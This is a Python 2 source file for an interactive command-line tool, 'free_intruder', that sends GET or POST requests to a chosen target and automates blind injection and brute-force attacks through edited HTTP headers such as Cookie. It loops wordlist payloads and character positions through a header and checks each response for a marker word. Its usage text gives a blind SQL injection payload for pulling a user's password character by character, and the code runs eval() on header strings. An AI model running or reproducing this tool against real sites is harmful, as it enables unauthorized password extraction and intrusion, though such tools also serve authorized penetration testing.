# -*- coding: utf-8 -*-

from os import system, name
from colorama import Fore, Back, Style, init
import socket,sys
import requests
import time
import json
import re
import time
init(autoreset=True)





__author__ = "Mustafa GÜNDOĞDU"
class free_intruder:
    



    def banner(self):

        print(Fore.GREEN+'''\t\t\t  
        
        @b3kc4t   _____                         
                 / ___/       __  __     ____         __
                | /     |\   /| | \ \   / / ||       /\ \ 
                | |__   | | | | |  \ \ / /| ||      /  \ \ 
                |__  |  | | | | |   \   / | ||     / __ \ \ 
                ___| |  | |_| | |    \|/  | ||    / /__\ \ \ 
               /_____|  |_____|_|    |||  | ||___/ /____\ \ \ 
                                     |||  |_____/ /      \ \ \   
        
                [ FREE ENUMERATING IDENTIFIERS ]

                                     
                                     '''+Fore.BLUE+"      [*][+][?][-]")

                



    def target_req(self):
        try:
            #program exit variable
            exit_command = ''

            while exit_command != 'quit':

                #command line interface input
                i_cmd = raw_input(Fore.GREEN +'[Command]>>')

                if i_cmd == 'quit':
                    #exit program
                    exit_command = i_cmd

                #target domain address
                elif i_cmd == 'url':
                    print("")
                    
                    #HTTP REQUEST METHOD INPUT
                    http_method = raw_input(Fore.GREEN+'HTTP REQUEST METHOD>>')
                    
                    if http_method == 'get' or http_method == 'GET':

                        try:

                            target_domain = raw_input(Fore.GREEN +'[Target Domain]>>')
                    
                        except:
                            #ERROR URL INPUT
                            exit_command = 'quit'

                        #if exit program
                        if target_domain == 'quit':
                            exit_command = target_domain

                    
                    
                        #program execute control
                        else:
                        
                            try:
                                #domain response
                                #IMPORTANT! Session is IMPORTANT
                                s = requests.Session()
                                response = s.get(target_domain)
                
                                #request headers
                                all_header = response.headers
                                #header json parse
                                #rh = json.dumps(response.headers.__dict__['_store'])
                
                
                                print('************************ {} *************************'.format(i_cmd))
                
                                #

                                operation_c = raw_input(Fore.BLUE+str(target_domain)+'>>')

                                if operation_c == 'edit':
                                
                                    #http heaer add commands
                                    default_header_list =['Connection','Cookie','Accept-Encoding','Accept-Charset','Accept-Language','Access-Control-Allow-Origin']

                                    #Information tool usage
                                    print(Fore.GREEN+"[*] IF YOU ARE GOING TO SEND HTTP HEADER VALUES WITH VALUES IN THE PAYLOAD LIST , YOU MUST PUT '$' AND '#' CHARACTERS BEFORE AND AFTER THE VALUE. LIKE US => Header_value=x'+UNION+SELECT+username+FROM+users+WHERE+username='mustafa'+AND+substring(password,1,1)='$try#'--; <= | IF YOU ARE TO OPERATE WITH A BRUTE FORCE ATTACK, ENTER THE LENGTH OF THE ATTACK TRIAL AND ADD '?' TO THE BEGINING AND END OF THE AREA YOU WANT TO INCREASE YOU MUST ADD THE CHARACTER. LIKE US => Header_value=x'+UNION+SELECT+username+FROM+users+WHERE+username='mustafa'+AND+substring(password,?1?,1)='$try#'--; <= [*] ")
                                
                                    print("")
                                    print(Fore.GREEN+" [!] RECEIVED FROM SERVER HTTP HEADERS VALUE [!]")
                                
                                    print(all_header)
                                
                                    print("")
                                    print(Fore.GREEN+"[*] HTTP HEADERS RECEIVED AS COMMAND INPUT [*]")
                                    print(Fore.BLUE+"*****************************")
                                    print(default_header_list)
                                    print("")
                                    print(Fore.BLUE+"*****************************")

                                    old_header = raw_input(Fore.BLUE+str(operation_c)+Fore.GREEN + ' HTTP HEADER>>')
                                    if old_header in default_header_list:

                                        #You must put the characters $, # at the beginning and end of the value to be changed from the list.
                                        if old_header in default_header_list:

                                            new_header = raw_input(Fore.BLUE + str(operation_c)+Fore.GREEN + ' HTTP HEADER VALUE>>')
                                    
                                            response.request.headers.update({str(old_header):str(new_header)})
                                            #editing response header
                                            editing_header = response.request.headers
                                    
                                            #if client want json format
                                            new_headers_json = json.dumps(editing_header.__dict__['_store'])
                                    


                                            print(Fore.BLUE+" ~~#~~ CHANGED HTTP HEADER VALUE ~~#~~ ")
                                            print(str(editing_header))
                                    
                                            attack_op = raw_input(Fore.GREEN+'(send/blind/cancel)>>')

                                            if attack_op == 'send':

                                                #header send and response

                                                result_req = s.get(target_domain, headers=editing_header)
                                                content_result = str(result_req.content)
                                            
                                                #result send parameter
                                                ans_res = raw_input(Fore.GREEN+"[?] Show Answer (Y/N)[?]")
                                                if ans_res == 'Y' or ans_res == 'y':

                                                    print(Fore.BLUE+" *** RESPONSE FROM TARGET URL *** ")
                                                
                                                    #print Content RESULT
                                                    print(Fore.WHITE+content_result)

                                                elif ans_res == 'N' or ans_res == 'n':
                                                    #PROCESS İS SUCCESSFULL 
                                                    print(Fore.BLUE+" *** MISSION COMPLETED ***")
                                            
                                                    s_ans = raw_input(Fore.RED+" [?] Do you Want the Word Searched in answer(Y/N) [?]")
                                            
                                                    if s_ans == 'Y' or s_ans == 'y':
                                                        #input search word
                                                        search_word = raw_input(Fore.BLUE+"Word>>")
                                                        #result search word
                                                        word_result = content_result.find(search_word)
                                                    
                                                        if word_result != -1:
                                                            print(Fore.RED+"[+] {} FOUND [+]".format(search_word))
                                                    
                                                        else:
                                                            print(Fore.RED+"[-] {} NOT FOUND [-]".format(search_word))
                                            
                                                    elif s_ans == 'N' or s_ans == 'n':
                                                        print(Fore.RED+"[*] BACK EDIT PART [*]")
                                                        #Back Edit Part
                                                        operation_c = 'edit'

    
                                                    else:
                                                        print(Fore.RED+"[*] STARTING POINT [*]")
                                                        #back start part
                                                        i_cmd = 'url'
                                        
                                                #EXIT PROGRAM
                                                else:
                                                    print(Fore.RED+"[*] EXITING PROGRAM [*]")
                                                    sys.exit(0)

                                                    

                                            elif attack_op == 'blind':
                            
                                                #for enumeraitng identifiers detect values
                                                payloads = ''
                                                payload_list = []
                                                print(Fore.BLUE+" ~~ AUTOMATIC BLIEND ATTEMPT ~~ ")
                                                print(Fore.BLUE+"#[ PAYLOAD LIST CREATE ]#")
                                                print(Fore.BLUE+"[*] IF Entered 'ok' , Payload append is STOP [*]")
                                        
                                            
                                                #if ok input received process is completed
                                                while payloads != 'ok':
                                                    payloads = raw_input(Fore.GREEN+"ENTRY>>")
                                                    payload_list.append(payloads)
                                        
                                        
                                                #INPUT HEADER VALUE SEARCH
                                            
                                                #sub check
                                                plus_result = re.search(re.escape('?')+"(.*)"+re.escape('?'), str(editing_header))
                                                #payload check
                                                find_result = re.search(re.escape('$')+"(.*)"+re.escape('#'), str(editing_header))


                                                if plus_result is not None:
                                                
                                                    result_list = []
                                                    print(Fore.RED+"[*] Required a word for Result True Check [*]")
                                                    search_name = raw_input(Fore.BLUE+'Word>>')



                                                    #count detect
                                                    count = 1

                                                    #if find_result is not None:
                                                    length_sub = raw_input(Fore.BLUE+"Length>>")
                                                    #CONTROL PAYLOADS PROCESS
                                                
                                                    try:

                                                        for sub in range(count, int(length_sub)):
                                                            #length
                                                    
                                                            sub_header = str(editing_header).replace(str(plus_result.group(0)), str(sub))

                                                            #Edit http header data type trans dictionary
                                                            sub_edit = eval(sub_header)
                                                        
                                                            #
                                                
                                                            #choose character in payload list
                                                            for i in payload_list:

                                                                #payload trying part
                                                                last_header = str(sub_edit).replace(str(find_result.group(0)), str(i))
                                                        
                                                                header_send = eval(last_header)
                                                                #
                                                                get_request = s.get(target_domain, headers=header_send)
                                                                content_result = str(get_request.content)
                                                                #
                                                                search_result = content_result.find(search_name)
                                                                if search_result != -1:
                                                                    result_list.append(i)
                                                                    print(i+" => STEP {}".format(sub))

                                                            print(Fore.GREEN+"STEP {} COMPLETED".format(sub))
                                                    
                                                    except:
                                                        print("[-] SOMETHING WENT WRONG [-]")
                                                        #program exit ask
                                                        e_choose = raw_input("Do you Leave Program?(Y/N)")
                                                    
                                                        if e_choose == 'Y' or e_choose == 'y':
                                                            #exit successfully program
                                                            sys.exit(0)

                                                        elif e_choose == 'N' or e_choose == 'n':
                                                            #BACK Edit part
                                                            operation_c = 'edit'
                                                    
                                                        else:
                                                            #Unquestioned successfully exit
                                                            sys.exit(0)

            


                                            
                                                
                                                #find_result control
                                                elif plus_result is None:
                                            
                                                
                                                    if find_result is not None:
                                                        #result character in wordlist
                                        
                                                        result_list = []
                                                        print(Fore.RED+"[*] Required a word for Result True Check [*]")
                                                        search_name = raw_input(Fore.BLUE+'Word>>')
                                        
                                                        for i in payload_list:
                                            
                                                            #paylaod trying part
                                                            last_header = str(editing_header).replace(str(find_result.group(0)), str(i))
                                            
                                            

                                                            header_send = eval(last_header)
                                                            get_request = s.get(target_domain, headers=header_send)
                                                            content_result = str(get_request.content)
                                            
                                                            search_result = content_result.find(search_name)
                                                            if search_result != -1:
                                                                result_list.append(i)

                                                        for j in result_list:
                                                            print(j)
                                            
                                                    else:

                                                        print("[-] '$' '#' characters not found [-]")
                                            
                                                        #header clear value
                                                        editing_header.clear()

                                                        #Edit part back
                                                        operation_c = 'edit'
                                            
                                            


                                                #sub_result and find_result is none
                                                else:

                                                    print("[-] '?' '$' '#' characters not found [-]")

                                                    editing_header.clear()
                                                    operation_c = 'edit'




                                            elif attack_op == 'cancel':
                                        
                                                #header clear value
                                                editing_header.clear()
                                                #Edit part back
                                                operation_c = 'edit'
                                        


                                            else:
                                        
                                                #if not choose 
                                                print(Fore.RED+"[-] You did not Choose [-]")
                                                print(Fore.RED+"[?] Check Out? (Y/N)")
                                                #choose input from user
                                                choose_exit = raw_input(Fore.BLUE+"Choose>>")
                                        
                                                #choose character is yes
                                                if choose_exit == 'Y' or choose_exit == 'y':
                                                    #Program success exit
                                                    sys.exit(0)

                                                #choose character is no
                                                elif choose_exit == 'N' or choose_exit == 'n':
                                                    print(Fore.RED+"[*] HTTP Header Edit Part Gone [*]")
                                                    operation_c = 'edit'

                                                #not choose successfully exit program
                                                else:
                                                    #Program success exit
                                                    sys.exit(0)




                            except:
                                print("[!] URL INPUT ERROR [!]")
                                print("[*] Please Look at the Documantation [*]")
                                sys.exit(0)



                    #IF HTTP METHOD POST INPUT
                    elif http_method == 'post' or http_method == 'POST':
                        
                        try:
                        
                            target_domain = raw_input(Fore.GREEN +'[Target Domain]>>')
                        
                        except:
                            #ERROR URL INPUT
                            exit_command = 'quit'

                        #if exit program
                        if target_domain == 'quit':
                            exit_command = target_domain

                        #program execute control
                        else:

                            try:
                                #domain response
                                #IMPORTANT! Session is IMPORTANT
                                s = requests.Session()
                                response = s.post(target_domain)

                                #request headers
                                all_header = response.headers
                                #header json parse
                                #rh = json.dumps(response.headers.__dict__['_store'])


                                print('************************ {} *************************'.format(i_cmd))

                                #
                                operation_c = raw_input(Fore.BLUE+str(target_domain)+'>>')

                                if operation_c == 'edit':

                                    #http heaer add commands
                                    default_header_list =['Connection','Cookie','Accept-Encoding','Accept-Charset','Accept-Language','Access-Control-Allow-Origin']

                                    #Information tool usage
                                    print(Fore.GREEN+"[*] [*] IF YOU ARE GOING TO SEND HTTP HEADER VALUES WITH VALUES IN THE PAYLOAD LIST , YOU MUST PUT '$' AND '#' CHARACTERS BEFORE AND AFTER THE VALUE. LIKE US => Header_value=x'+UNION+SELECT+username+FROM+users+WHERE+username='mustafa'+AND+substring(password,1,1)='$try#'--; <= | IF YOU ARE TO OPERATE WITH A BRUTE FORCE ATTACK, ENTER THE LENGTH OF THE ATTACK TRIAL AND ADD '?' TO THE BEGINING AND END OF THE AREA YOU WANT TO INCREASE YOU MUST ADD THE CHARACTER. LIKE US => Header_value=x'+UNION+SELECT+username+FROM+users+WHERE+username='mustafa'+AND+substring(password,?1?,1)='$try#'--; <= [*] ")
                                    print("")

                                    print(Fore.GREEN+" [!] RECEIVED FROM SERVER HTTP HEADERS VALUE [!]")

                                    print(all_header)

                                    print("")
                                    print(Fore.GREEN+"[*] HTTP HEADERS RECEIVED AS COMMAND INPUT [*]")
                                    print(Fore.BLUE+"*****************************")
                                    print(default_header_list)
                                    print("")
                                    print(Fore.BLUE+"*****************************")

                                    old_header = raw_input(Fore.BLUE+str(operation_c)+Fore.GREEN + ' HTTP HEADER>>')
                                    if old_header in default_header_list:

                                        #You must put the characters $, # at the beginning and end of the value to be changed from the list.
                                        if old_header in default_header_list:

                                            new_header = raw_input(Fore.BLUE + str(operation_c)+Fore.GREEN + ' HTTP HEADER VALUE>>')

                                            response.request.headers.update({str(old_header):str(new_header)})
                                            #editing response header
                                            editing_header = response.request.headers

                                            #if client want json format
                                            new_headers_json = json.dumps(editing_header.__dict__['_store'])



                                            print(Fore.BLUE+" ~~#~~ CHANGED HTTP HEADER VALUE ~~#~~ ")
                                            print(str(editing_header))

                                            attack_op = raw_input(Fore.GREEN+'(send/blind/cancel)>>')

                                            if attack_op == 'send':

                                                #header send and response

                                                result_req = s.post(target_domain, headers=editing_header)
                                                content_result = str(result_req.content)
                                                #result send parameter
                                                ans_res = raw_input(Fore.GREEN+"[?] Show Answer (Y/N)[?]")
                                                if ans_res == 'Y' or ans_res == 'y':

                                                    print(Fore.RED+" *** RESPONSE FROM TARGET URL ***")

                                                    print(Fore.WHITE+content_result)

                                                elif ans_res == 'N' or ans_res == 'n':
                                                    print(" *** MISSION COMPLETED ***")

                                                    s_ans = raw_input(Fore.RED+" [?] Do you Want the Word Searched in answer(Y/N) [?]")

                                                    if s_ans == 'Y' or s_ans == 'y':
                                                        #input search word
                                                        search_word = raw_input(Fore.BLUE+"Word>>")
                                                        #result search word
                                                        word_result = content_result.find(search_word)

                                                        if word_result != -1:
                                                            print(Fore.RED+"[+] {} FOUND [+]".format(search_word))

                                                        else:
                                                            print(Fore.RED+"[-] {} NOT FOUND [-]".format(search_word))

                                                    elif s_ans == 'N' or s_ans == 'n':
                                                        print(Fore.RED+"[*] BACK EDIT PART [*]")
                                                        #Back Edit Part
                                                        operation_c = 'edit'


                                                    else:
                                                        print(Fore.RED+"[*] STARTING POINT [*]")
                                                        #back start part
                                                        i_cmd = 'url'

                                                #EXIT PROGRAM
                                                else:
                                                    print(Fore.RED+"[*] EXITING PROGRAM [*]")
                                                    sys.exit(0)



                                            elif attack_op == 'blind':

                                                #for enumerating identifiers detect values
                                                payloads = ''
                                                payload_list = []
                                                print(Fore.BLUE+" ~~ AUTOMATIC BLIEND ATTEMPT ~~ ")
                                                print(Fore.BLUE+"#[ PAYLOAD LIST CREATE ]#")
                                                print(Fore.BLUE+"[*] IF Entered 'ok' , Payload append is STOP [*]")

                                                #if ok input received process is completed
                                                while payloads != 'ok':
                                                    payloads = raw_input(Fore.GREEN+"ENTRY>>")
                                                    payload_list.append(payloads)


                                                #INPUT HEADER VALUE SEARCH

                                                #sub check
                                                plus_result = re.search(re.escape('?')+"(.*)"+re.escape('?'), str(editing_header))
                                                #payload check
                                                find_result = re.search(re.escape('$')+"(.*)"+re.escape('#'), str(editing_header))


                                                if plus_result is not None:

                                                    result_list = []
                                                    print(Fore.RED+"[*] Required a word for Result True Check [*]")
                                                    search_name = raw_input(Fore.BLUE+'Word>>')



                                                    #count detect
                                                    count = 1

                                                    #if find_result is not None:
                                                    length_sub = raw_input(Fore.BLUE+"Length>>")
                                                    #CONTROL PAYLOADS PROCESS

                                                    try:
                                                        for sub in range(count, int(length_sub)):
                                                            #length

                                                            sub_header = str(editing_header).replace(str(plus_result.group(0)), str(sub))

                                                            #Edit http header data type trans dictionary
                                                            sub_edit = eval(sub_header)

                                                            #

                                                            #choose character in payload list
                                                            for i in payload_list:

                                                                #payload trying part
                                                                last_header = str(sub_edit).replace(str(find_result.group(0)), str(i))

                                                                header_send = eval(last_header)
                                                                #

                                                                get_request = s.post(target_domain, headers=header_send)
                                                                content_result = str(get_request.content)
                                                                #

                                                                search_result = content_result.find(search_name)
                                                                if search_result != -1:
                                                                    result_list.append(i)
                                                                    print(i+" => STEP {}".format(sub))

                                                            print(Fore.GREEN+"STEP {} COMPLETED".format(sub))

                                                    except:
                                                        print("[-] SOMETHING WENT WRONG [-]")
                                                        #program exit ask
                                                        e_choose = raw_input("Do you Leave Program?(Y/N)")

                                                        if e_choose == 'Y' or e_choose == 'y':
                                                            #exit successfully program
                                                            sys.exit(0)

                                                        elif e_choose == 'N' or e_choose == 'n':
                                                            #BACK Edit part
                                                            operation_c = 'edit'

                                                        else:
                                                            #Unquestioned successfully exit
                                                            sys.exit(0)






                                                #find_result control
                                                elif plus_result is None:


                                                    if find_result is not None:
                                                        #result character in wordlist

                                                        result_list = []
                                                        print(Fore.RED+"[*] Required a word for Result True Check [*]")
                                                        search_name = raw_input(Fore.BLUE+'Word>>')

                                                        for i in payload_list:

    
                                                            last_header = str(editing_header).replace(str(find_result.group(0)), str(i))



                                                            header_send = eval(last_header)
                                                            get_request = s.post(target_domain, headers=header_send)
                                                            content_result = str(get_request.content)

                                                            search_result = content_result.find(search_name)
                                                            if search_result != -1:
                                                                result_list.append(i)

                                                        for j in result_list:
                                                            print(j)

                                                    else:

                                                        print("[-] '$' '#' characters not found [-]")

                                                        #header clear value
                                                        editing_header.clear()

                                                        #Edit part back
                                                        operation_c = 'edit'



                                                #sub_result and find_result is none
                                                else:

                                                    print("[-] '?' '$' '#' characters not found [-]")

                                                    editing_header.clear()
                                                    operation_c = 'edit'


                                            elif attack_op == 'cancel':

                                                #header clear value
                                                editing_header.clear()
                                                #Edit part back
                                                operation_c = 'edit'

                                            else:

                                                #if not choose
                                                print(Fore.RED+"[-] You did not Choose [-]")
                                                print(Fore.RED+"[?] Check Out? (Y/N)")
                                                #choose input from user
                                                choose_exit = raw_input(Fore.BLUE+"Choose>>")

                                                #choose character is yes
                                                if choose_exit == 'Y' or choose_exit == 'y':
                                                    #Program success exit
                                                    sys.exit(0)

                                                #choose character is no
                                                elif choose_exit == 'N' or choose_exit == 'n':
                                                    print(Fore.RED+"[*] HTTP Header Edit Part Gone [*]")
                                                    operation_c = 'edit'

                                                #not choose successfully exit program
                                                else:
                                                    #Program success exit
                                                    sys.exit(0)




                            except:
                                print("[!] URL INPUT ERROR [!]")
                                print("[*] Please Look at the Documantation [*]")
                                sys.exit(0)


                    
                    
                    
                    
                    
                    elif i_cmd == 'help':

                        print(Fore.BLUE+"{COMMAND LIST}")
                        print(Fore.GREEN+"[quit], [edit], [url], [send], [intruder], [help]")

                        print(Fore.GREEN+"[quit] => Program Exit")
                        print(Fore.GREEN+"[edit] => HTML Header Edit")
                        print(Fore.GREEN+"[blind] => Try Organized Html Header With payload Wordlist")
                        print(Fore.GREEN+"[send] => Send Edit HTTP HEADER target domain address and Receive Response")
                        print(Fore.GREEN+"[clear] => Clear Terminal Screen")
                    
                        print("")
                        print("")
                        print(Fore.GREEN+"{INPUT CHOOSE LIST}")

                        print(Fore.BLUE+"[HTTP HEADER>>] => ENTRIES TAKEN BY SELECTING FROM DEFAULT HTTP HEADERS")
                        print(Fore.BLUE+"[HTTP HEADER VALUE>>] => VALUE ENTRY OF THE HTTP HEADER RECEIVED AS INPUT")
                        print(Fore.BLUE+"[Word>>] => CHECK TRUE RESPONSE FOR BLIND INJECTION ATTACK")            
                    

                    elif i_cmd == 'clear':
                        self.clear()

        except KeyboardInterrupt:
            print("[-] EXITING [-]")
            sys.exit(0)
                            
        
                            
                            
    def clear(self):

        time.sleep(1)
        # for linux os.name posix
        
        _ = system('clear')
                            
                 
                            
    def help(self):
        print("{COMMAND LIST}")
        print("[quit], [edit], [url], [send], [blind], [help]")
        
        print("{INPUT COMMAND INFORMATION}")
        print("")




if __name__ == '__main__':
    o = free_intruder()
    o.banner()
    o.target_req()
